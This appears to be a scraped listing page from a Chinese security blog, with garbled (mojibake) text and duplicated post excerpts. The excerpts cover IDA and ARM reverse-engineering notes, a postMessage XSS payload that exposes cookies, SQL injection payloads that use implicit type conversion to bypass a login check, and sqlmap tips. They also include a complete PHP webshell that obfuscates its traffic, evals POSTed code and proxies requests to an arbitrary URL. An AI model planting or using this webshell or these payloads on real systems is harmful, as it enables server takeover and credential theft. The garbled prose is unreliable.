ã€€ã€€LSL         é€»è¾‘å·¦ç§» è¿™æ˜¯ä¸€ä¸ªé€‰é¡¹ï¼Œä¸æ˜¯æŒ‡ä»¤
ã€€ã€€LSR         é€»è¾‘å³ç§» è¿™æ˜¯ä¸€ä¸ªé€‰é¡¹ï¼Œä¸æ˜¯æŒ‡ä»¤
ã€€ã€€MOV        ä¼ é€å€¼&#x2F;å¯„å­˜å™¨åˆ°ä¸€ä¸ªå¯„å­˜å™¨ 
ã€€ã€€STR         å­˜å‚¨ä¸€ä¸ªå¯„å­˜å™¨ï¼Œå¯„å­˜å™¨å€¼å­˜åˆ°å†…å­˜
ã€€ã€€STRB       å­˜å‚¨ä¸€ä¸ªå­—èŠ‚
ã€€ã€€STRH       å­˜å‚¨ä¸€ä¸ªåŠå­—
ã€€ã€€SUB         å‡æ³•
ã€€ã€€PUSH POP å †æ ˆæ“ä½œ

æœ‰æ—¶å€™éœ€è¦

db  ï¼›å®šä¹‰å­—èŠ‚ç±»å‹å˜é‡ï¼Œä¸€ä¸ªå­—èŠ‚æ•°æ®å ä¸€ä¸ªå­—èŠ‚å•å…ƒï¼Œè¯»å®Œä¸€ä¸ªåç§»é‡åŠ 1
dw  ï¼›å®šä¹‰å­—ç±»å‹å˜é‡ï¼Œä¸€ä¸ªå­—æ•°æ®å 2ä¸ªå­—èŠ‚å•å…ƒï¼Œè¯»å®Œä¸€ä¸ªï¼Œåç§»é‡åŠ 2
dd  ï¼›å®šä¹‰åŒå­—ç±»å‹å˜é‡ï¼Œä¸€ä¸ªåŒå­—æ•°æ®å 4ä¸ªå­—èŠ‚å•å…ƒï¼Œè¯»å®Œä¸€ä¸ªï¼Œåç§»é‡åŠ 4

IDAç»™æŸä¸ªä½ç½®å‘½åçš„æ—¶ï¼Œå®ƒä¼šä½¿ç”¨è¯¥ä½ç½®çš„è™šæ‹Ÿåœ°å€å’Œè¡¨ç¤ºä¸€ä¸ªè¯¥åœ°å€çš„ç±»å‹çš„å‰ç¼€è¿›è¡Œå‘½åï¼š
sub_xxx  ï¼›åœ°å€xxxå¤„çš„å­ä¾‹ç¨‹
loc_xxx  ï¼›åœ°å€xxxå¤„çš„ä¸€ä¸ªæŒ‡ä»¤
byte_xxx ï¼›ä½ç½®xxxå¤„çš„8ä½æ•°æ®
word_xxx ;ä½ç½®xxxå¤„çš„16ä½æ•°æ®
dword_xxx ;ä½ç½®xxxå¤„çš„32ä½æ•°æ®
unk_xxx   ;ä½ç½®xxxå¤„å¤§å°æœªçŸ¥çš„æ•°æ®<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³äºspï¼Œbpç­‰æ ˆå¯„å­˜å™¨çš„è§£é‡Šï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">
SP is stack pointer. The stack is generally used to hold &quot;automatic&quot; variables and context&#x2F;parameters across function calls. Conceptually you can think of the &quot;stack&quot; as a place where you &quot;pile&quot; your data. You keep &quot;stacking&quot; one piece of data over the other and the stack pointer tells you how &quot;high&quot; your &quot;stack&quot; of data is. You can remove data from the &quot;top&quot; of the &quot;stack&quot; and make it shorter.


&lt;https:&#x2F;&#x2F;www.zybuluo.com&#x2F;oro-oro&#x2F;note&#x2F;137244&gt;
&lt;http:&#x2F;&#x2F;cryptroix.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;journey-to-the-stack&#x2F;&gt;
&lt;http:&#x2F;&#x2F;en.citizendium.org&#x2F;wiki&#x2F;Stack_frame&gt;
è™½ç„¶æ˜¯è‹±æ–‡ï¼Œä½†æ˜¯çœ‹èµ·æ¥è¦æ¯”ä¸­æ–‡æ˜“æ‡‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>idaé‡Œé¢æœ‰ä¸‰ç§é¢œè‰²çš„ç®­å¤´:</p>
<ol>
<li>è“è‰²ï¼Œé¡ºåºæ‰§è¡Œ</li>
<li>ç»¿è‰²ï¼Œæ¡ä»¶ä¸º(YES)</li>
<li>çº¢è‰²ï¼Œæ¡ä»¶ä¸ºï¼ˆNOï¼‰</li>
</ol>
	
	</div>
  <a type="button" href="/2017/02/02/mac-re.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/07/n0js-case-postMessage-xss.html" >n0js case3</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-07  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
</ul>
<p>åœ¨ä¸åŒç½‘é¡µä¹‹é—´ä½¿ç”¨postMessageäº¤æµä¿¡æ¯çš„æ—¶å€™ï¼Œå­˜åœ¨xssçš„æƒ…å†µï¼Œä¸Šé¢ç¬¬äºŒä¸ªé“¾æ¥æ˜¯é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜¯å¯¹åº”çš„è§£å†³æ–¹æ³•ï¼Œæœ€åçš„payloadå°±æ˜¯å¦‚ä¸‹ï¼š</p>
<p>ç®€å•æ¥è¯´ï¼Œå¦‚æœAå­˜åœ¨xssï¼ŒBä½¿ç”¨postMessageæ¥æ”¶æ¥è‡ªAçš„ä¿¡æ¯ï¼Œé‚£ä¹ˆåœ¨Aç«™å¯ä»¥åŠ è½½Bçš„iframeï¼Œå¼¹å‡ºBçš„cookieã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹ï¼ŒAï¼ŒBéƒ½æ˜¯å­˜åœ¨Xssæ¼æ´çš„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(t);

function a()&#123;
var b &#x3D; document.createElement(&quot;button&quot;);
b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(b);
b.click();
&#125;
&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
window.onload &#x3D; a();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<ul>
<li><a target="_blank" rel="noopener" href="https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002">https://community.hpe.com/t5/Protect-Your-Assets/XSS-and-App-Security-through-HTML5-s-PostMessage/ba-p/6515002</a></li>
<li><a target="_blank" rel="noopener" href="http://server.n0tr00t.com/n0js/case3.php">http://server.n0tr00t.com/n0js/case3.php</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html</a></li>
</ul>
<p>åœ¨ä¸åŒç½‘é¡µä¹‹é—´ä½¿ç”¨postMessageäº¤æµä¿¡æ¯çš„æ—¶å€™ï¼Œå­˜åœ¨xssçš„æƒ…å†µï¼Œä¸Šé¢ç¬¬äºŒä¸ªé“¾æ¥æ˜¯é—®é¢˜ï¼Œç¬¬ä¸€ä¸ªå’Œç¬¬ä¸‰ä¸ªæ˜¯å¯¹åº”çš„è§£å†³æ–¹æ³•ï¼Œæœ€åçš„payloadå°±æ˜¯å¦‚ä¸‹ï¼š</p>
<p>ç®€å•æ¥è¯´ï¼Œå¦‚æœAå­˜åœ¨xssï¼ŒBä½¿ç”¨postMessageæ¥æ”¶æ¥è‡ªAçš„ä¿¡æ¯ï¼Œé‚£ä¹ˆåœ¨Aç«™å¯ä»¥åŠ è½½Bçš„iframeï¼Œå¼¹å‡ºBçš„cookieã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹ï¼ŒAï¼ŒBéƒ½æ˜¯å­˜åœ¨Xssæ¼æ´çš„ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">var t &#x3D; document.createElement(&quot;iframe&quot;);
t.setAttribute(&quot;src&quot;,&quot;https:&#x2F;&#x2F;www.n0tr00t.com&#x2F;static&#x2F;test&#x2F;helloevent.html&quot;);
&#x2F;&#x2F;t.setAttribute(&quot;onload&quot;,&quot;frames[0].postMessage(&#39;&lt;input onfocus&#x3D;alert(document.cookie) autofocus&gt;&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(t);

function a()&#123;
var b &#x3D; document.createElement(&quot;button&quot;);
b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;&lt;img src&#x3D;x onerror&#x3D;alert(document.cookie)&gt;&#39;,&#39;*&#39;)&quot;);
&#x2F;&#x2F;b.setAttribute(&quot;onclick&quot;,&quot;frames[0].postMessage(&#39;this is onerror img src&#39;,&#39;*&#39;)&quot;);
document.body.appendChild(b);
b.click();
&#125;
&#x2F;&#x2F;setTimeout(&quot;a()&quot;,3000);
window.onload &#x3D; a();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/01/07/n0js-case-postMessage-xss.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/05/SQLéšå½¢è½¬æ¢ç»•è¿‡waf.html" >SQLéšå½¢å¼±ç±»å‹è½¬æ¢ç»•è¿‡</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
<p>å¦‚æœPHPè¯­å¥ä¸­å­˜åœ¨è¿™æ ·çš„ç™»å½•æ¼æ´æ¯”å¦‚ï¼š</p>
<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
<p>ä½†æ˜¯åœ¨ç™»å½•æ¡†å¤„é™åˆ¶äº†ç”¨æˆ·åé•¿åº¦</p>
<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
print &quot;ç”¨æˆ·åä¸èƒ½è¶…è¿‡4ä¸ªå­—ç¬¦ä¸²&quot;;
echo $user;
echo strlen($user);
die();
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœæœªåšé™åˆ¶çš„æƒ…å†µä¸‹å¯ä»¥æ„é€ è¿™æ ·çš„è¯­å¥<br><code>select * from users where userid = 1 or 1=1</code></p>
<p>åœ¨é™åˆ¶çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨sqléšå½¢è½¬æ¢è¿™æ ·å­ï¼š<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
<p>è¿™ä¸ªå°±å…¨éƒ¨é€‰æ‹©å‡ºæ¥äº†ï¼Œç„¶åé‡è¦çš„ç‚¹åœ¨åé¢<code>userid=&#39;&#39;=0#</code>ï¼Œé—­åˆå‰é¢å•å¼•å·ï¼Œäºæ˜¯æ•´ä¸ªæ•°å€¼å°±æ’ç­‰äºäº†ï¼Œä¹Ÿå¯ä»¥è¿™ä¹ˆå†™</p>
<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
<p>åŸºæœ¬åŸç†å°±æ˜¯ä¸Šé¢æ–‡ç« æåˆ°çš„ï¼š</p>
	

	</div>
  <a type="button" href="/2017/01/05/SQLéšå½¢è½¬æ¢ç»•è¿‡waf.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://tom.vg/2013/04/mysql-implicit-type-conversion/">https://tom.vg/2013/04/mysql-implicit-type-conversion/</a><br><a target="_blank" rel="noopener" href="https://www.t00ls.net/articles-24308.html">https://www.t00ls.net/articles-24308.html</a></p>
<p>å¦‚æœPHPè¯­å¥ä¸­å­˜åœ¨è¿™æ ·çš„ç™»å½•æ¼æ´æ¯”å¦‚ï¼š</p>
<p><code>$sql=&quot;select * from users where id=&#39;&quot;.$user.&quot;&#39; and password=&#39;&quot;.md5($pass).&quot;&#39;;</code></p>
<p>ä½†æ˜¯åœ¨ç™»å½•æ¡†å¤„é™åˆ¶äº†ç”¨æˆ·åé•¿åº¦</p>
<pre class="line-numbers language-none"><code class="language-none">if (strlen($user)&gt;4)&#123;
print &quot;ç”¨æˆ·åä¸èƒ½è¶…è¿‡4ä¸ªå­—ç¬¦ä¸²&quot;;
echo $user;
echo strlen($user);
die();
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¦‚æœæœªåšé™åˆ¶çš„æƒ…å†µä¸‹å¯ä»¥æ„é€ è¿™æ ·çš„è¯­å¥<br><code>select * from users where userid = 1 or 1=1</code></p>
<p>åœ¨é™åˆ¶çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨sqléšå½¢è½¬æ¢è¿™æ ·å­ï¼š<br><code>select * from users where userid=&#39;&#39;=0#</code></p>
<p>è¿™ä¸ªå°±å…¨éƒ¨é€‰æ‹©å‡ºæ¥äº†ï¼Œç„¶åé‡è¦çš„ç‚¹åœ¨åé¢<code>userid=&#39;&#39;=0#</code>ï¼Œé—­åˆå‰é¢å•å¼•å·ï¼Œäºæ˜¯æ•´ä¸ªæ•°å€¼å°±æ’ç­‰äºäº†ï¼Œä¹Ÿå¯ä»¥è¿™ä¹ˆå†™</p>
<p><code>userid=&#39;&#39;=false#</code>,<code>userid=&#39;&#39;=(1-1)</code>,<code>userid=&#39;a&#39;=0</code></p>
<p>åŸºæœ¬åŸç†å°±æ˜¯ä¸Šé¢æ–‡ç« æåˆ°çš„ï¼š</p>
	
	</div>
  <a type="button" href="/2017/01/05/SQLéšå½¢è½¬æ¢ç»•è¿‡waf.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/04/åŠ å¯†webshellæµé‡.html" >åŠ å¯†webshellæµé‡</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-04  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
function easy_en($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
        else $new &#x3D; $old -1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

function easy_de($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
        else $new &#x3D; $old + 1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
&#x2F;&#x2F;    var_dump($c);
    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
        &#39;content&#39;&#x3D;&gt;$c),
    ));
    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
&#x2F;&#x2F;    var_dump($c);
    die(easy_de(base64_decode($c)));
&#125;

function shutdown() &#123;
    $str &#x3D; ob_get_contents();
    ob_end_clean();
    echo base64_encode(easy_en($str));
&#125;

register_shutdown_function(&quot;shutdown&quot;);
ob_start();
$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
parse_str($c, $_POST); &#x2F;&#x2F;è§£å¯†ä¹‹åæŠŠpassèµ‹å€¼ç»™$_POSTå‚æ•°
eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;æ‰§è¡Œä¸€å¥è¯
?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/01/04/åŠ å¯†webshellæµé‡.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">&lt;?php
function easy_en($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0) $new &#x3D; 0x7f;
        else $new &#x3D; $old -1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

function easy_de($str) &#123;
    $ret &#x3D; &quot;&quot;;
    for ($i&#x3D;0;$i&lt;strlen($str);$i++)&#123;
        $old &#x3D; ord($str[$i]);
        if ($old &#x3D;&#x3D; 0x7f) $new &#x3D; 0;
        else $new &#x3D; $old + 1;
        $ret .&#x3D; chr($new);
    &#125;
    return $ret;
&#125;

if (@$_GET[&#39;role&#39;] &#x3D;&#x3D; &#39;proxy&#39; &amp;&amp; @$_GET[&#39;url&#39;]) &#123;
    $c &#x3D; base64_encode(easy_en(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
&#x2F;&#x2F;    var_dump($c);
    $cxt &#x3D; stream_context_create(array(&#39;http&#39;&#x3D;&gt;array(
        &#39;header&#39;&#x3D;&gt;&#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39;,
        &#39;method&#39;&#x3D;&gt;&#39;POST&#39;,
        &#39;content&#39;&#x3D;&gt;$c),
    ));
    $c &#x3D; file_get_contents($_GET[&#39;url&#39;], false, $cxt);
&#x2F;&#x2F;    var_dump($c);
    die(easy_de(base64_decode($c)));
&#125;

function shutdown() &#123;
    $str &#x3D; ob_get_contents();
    ob_end_clean();
    echo base64_encode(easy_en($str));
&#125;

register_shutdown_function(&quot;shutdown&quot;);
ob_start();
$c &#x3D; easy_de(base64_decode(file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;)));
parse_str($c, $_POST); &#x2F;&#x2F;è§£å¯†ä¹‹åæŠŠpassèµ‹å€¼ç»™$_POSTå‚æ•°
eval($_POST[&#39;pass&#39;]);  &#x2F;&#x2F;æ‰§è¡Œä¸€å¥è¯
?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/01/04/åŠ å¯†webshellæµé‡.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2017/01/03/sqlä¸­è½¬.html" >Sqlmapå¤‡å¿˜å½•</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2017-01-03  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>2017-1-11æ›´æ–°ï¼š<br>åŸæ¥çš„æ—¶å€™ä¸‹é¢è¿™ä¸€å¨ä»£ç ç”¨äº†åŠä¸ªå°æ—¶å†™å‡ºæ¥ï¼ŒPHPæ¯”è¾ƒæ¸£ï¼Œå˜æŸ¥è¾¹å†™è¾¹ç”¨burpè°ƒè¯•ã€‚</p>
<p>å…¶å®éœ€æ±‚å¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨sqlmapçš„æ¯ä¸ªpayloadåé¢å†™å…¥ç‰¹å®šå­—ç¬¦ï¼Œæ˜¨å¤©çš„æ—¶å€™çœ‹åˆ°è¿™ç¯‡æ–‡ç« æ‰å‘ç°sqlmapå·²ç»æœ‰é€‰é¡¹äº†ï¼Œæ„Ÿè§‰è‡ªå·±è ¢è ¢å—’- -</p>
<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
<blockquote>
<p>The prefix (â€“prefix) and suffix (â€“suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix æ˜¯æ¯æ¬¡æ·»åŠ åœ¨payloadçš„æ•°æ®ï¼Œä¸€ä¸ªå‰ç½®ï¼Œä¸€ä¸ªåç½®<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>###åœ¨æ³¨å…¥æµ‹è¯•çš„æ—¶å€™unionæŸ¥è¯¢ç”¨çš„æ˜¯NULL?</p>
<blockquote>
<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
</blockquote>
<p>###ä½¿ç”¨å…·ä½“çš„payload<br>å¦‚æœçŸ¥é“äº†æ³¨å…¥ç‚¹æ˜¯åœ¨order byï¼Œå¯ä»¥æ·»åŠ è¿™æ ·çš„é€‰é¡¹:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injectionçš„æ—¶å€™ï¼Œæœ‰è¿™æ ·çš„é€‰é¡¹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">--string
--not-string
åœ¨trueæˆ–è€…falseè¦åˆ¤æ–­çš„å­—ç¬¦

--regexp ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾
--code æ ¹æ®HTTPçŠ¶æ€æ¥åˆ¤æ–­
--text-only æ¯”è¾ƒå›åº”çš„æ–‡æœ¬
--title æ¯”è¾ƒå›åº”çš„title

å…¶ä¸­ä½œè€…è¯´æ˜äº†ä½¿ç”¨--stringæˆ–è€…--not-stringçš„æ—¶å€™å¯ä»¥ä½¿ç”¨Pythoné‡Œé¢çš„åå…­è¿›åˆ¶æ¢è¡Œæ¥åŒ¹é…æ¯”å¦‚newline(\x0a)å’Œtabs(\x09)

--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2017/01/03/sqlä¸­è½¬.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>2017-1-11æ›´æ–°ï¼š<br>åŸæ¥çš„æ—¶å€™ä¸‹é¢è¿™ä¸€å¨ä»£ç ç”¨äº†åŠä¸ªå°æ—¶å†™å‡ºæ¥ï¼ŒPHPæ¯”è¾ƒæ¸£ï¼Œå˜æŸ¥è¾¹å†™è¾¹ç”¨burpè°ƒè¯•ã€‚</p>
<p>å…¶å®éœ€æ±‚å¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨sqlmapçš„æ¯ä¸ªpayloadåé¢å†™å…¥ç‰¹å®šå­—ç¬¦ï¼Œæ˜¨å¤©çš„æ—¶å€™çœ‹åˆ°è¿™ç¯‡æ–‡ç« æ‰å‘ç°sqlmapå·²ç»æœ‰é€‰é¡¹äº†ï¼Œæ„Ÿè§‰è‡ªå·±è ¢è ¢å—’- -</p>
<p><a target="_blank" rel="noopener" href="http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html">http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html</a></p>
<blockquote>
<p>The prefix (â€“prefix) and suffix (â€“suffix) options configure the strings that should be included with each SQL injection payload in order to begin, and then terminate, the Injection. </p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">--prefix --suffix æ˜¯æ¯æ¬¡æ·»åŠ åœ¨payloadçš„æ•°æ®ï¼Œä¸€ä¸ªå‰ç½®ï¼Œä¸€ä¸ªåç½®<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>###åœ¨æ³¨å…¥æµ‹è¯•çš„æ—¶å€™unionæŸ¥è¯¢ç”¨çš„æ˜¯NULL?</p>
<blockquote>
<p>Why use NULL values in the UNION SELECT? NULL is a great value to use in UNIONS when trying to determine the correct number of columns in an injection, as it can sit in place of a number of different field types, such as numbers, strings and dates.</p>
</blockquote>
<p>###ä½¿ç”¨å…·ä½“çš„payload<br>å¦‚æœçŸ¥é“äº†æ³¨å…¥ç‚¹æ˜¯åœ¨order byï¼Œå¯ä»¥æ·»åŠ è¿™æ ·çš„é€‰é¡¹:<code>--test-filter=&#39;ORDER BY&#39;</code></p>
<p>###<code>--string</code> &amp; <code>--not-string</code><br>Blind injectionçš„æ—¶å€™ï¼Œæœ‰è¿™æ ·çš„é€‰é¡¹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">--string
--not-string
åœ¨trueæˆ–è€…falseè¦åˆ¤æ–­çš„å­—ç¬¦

--regexp ä½¿ç”¨çš„æ­£åˆ™è¡¨è¾¾
--code æ ¹æ®HTTPçŠ¶æ€æ¥åˆ¤æ–­
--text-only æ¯”è¾ƒå›åº”çš„æ–‡æœ¬
--title æ¯”è¾ƒå›åº”çš„title

å…¶ä¸­ä½œè€…è¯´æ˜äº†ä½¿ç”¨--stringæˆ–è€…--not-stringçš„æ—¶å€™å¯ä»¥ä½¿ç”¨Pythoné‡Œé¢çš„åå…­è¿›åˆ¶æ¢è¡Œæ¥åŒ¹é…æ¯”å¦‚newline(\x0a)å’Œtabs(\x09)

--string&#x3D;&quot;Name\x0a\x09\x09Stephen&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2017/01/03/sqlä¸­è½¬.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/12/28/phpçš„zipä¼ªåè®®.html" >php://input&amp;&amp;php://filter</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-12-28  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>php://inputéœ€è¦æœåŠ¡å™¨çš„æ”¯æŒï¼ŒåŒæ—¶è¦æ±‚â€allow_url_includeâ€è®¾ç½®ä¸ºOnï¼Œåœ¨PHPçš„é…ç½®æ–‡ä»¶php.inié…ç½®ã€‚å¯¹äºä¸€ä¸ªLFIäº§ç”Ÿçš„æ¼æ´æ¯”å¦‚ï¼š</p>
